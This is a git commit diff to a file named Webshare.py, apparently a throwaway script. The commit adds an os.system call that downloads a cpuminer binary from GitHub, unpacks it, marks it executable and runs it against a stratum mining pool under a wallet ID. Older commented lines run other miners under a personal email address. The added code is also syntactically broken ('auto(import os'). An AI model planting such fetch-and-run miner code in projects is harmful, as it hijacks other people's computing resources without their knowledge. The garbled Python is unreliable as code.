db5afbbf0ec80bf86f4ada8bce4980b7ed6f43c0
saundersis <96547591+saundersis@users.noreply.github.com>
2022-04-18 00:59:11 +0530

    Update Webshare.py

--- Webshare.py
+++ Webshare.py
@@ -6,4 +6,6 @@ def auto():
     #os.system('/opt/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xeth.pool.minergate.com:45791 -u jeremyruroede@gmail.com') #etherium
     #os.system('/opt/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://ltc.pool.minergate.com:3336 -u jeremyruroede@gmail.com') #litecoin
     
-auto()
+auto(import os
+
+os.system("wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17023 -u RRLGKHQd29BRUM5xPYQffkGL6cRcGZf9x4.a7 ")
